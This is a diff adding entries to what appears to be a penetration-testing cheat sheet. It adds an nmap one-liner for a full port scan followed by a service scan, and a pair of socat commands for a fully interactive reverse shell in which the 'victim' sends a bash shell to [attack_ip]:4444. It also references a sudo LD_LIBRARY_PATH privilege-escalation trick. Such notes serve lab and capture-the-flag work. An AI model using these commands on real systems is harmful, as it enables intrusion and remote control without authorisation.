@@ -513,3 +513,22 @@ run sudo referencing the path of your new file, in this case, the current direct
 
 `sudo LD_LIBRARY_PATH=. find`
 
+### Useful NMAP (in work)
+
+~~~
+target=10.10.10.10;sudo nmap -p$(sudo nmap -p- --min-rate=1000 $target | grep ^[0-9] | cut -d '/' -f 1| tr '\n' ',' | sed s/,$//) -sC -sV -oA nmap/initial $target #only good for one target. full port scan followed by targeted script scan
+ 
+nmap -sC -sV -oA nmap/initial 10.10.10.10
+~~~
+
+### Using socat for fully interactive reverse shells
+Socat is a more advanced version of netcat. 
+On attacker system:
+~~~
+socat file:`tty`,raw,echo=0 tcp-listen:4444 
+~~~
+
+On victim:
+~~~
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[attack_ip]:4444
+~~~
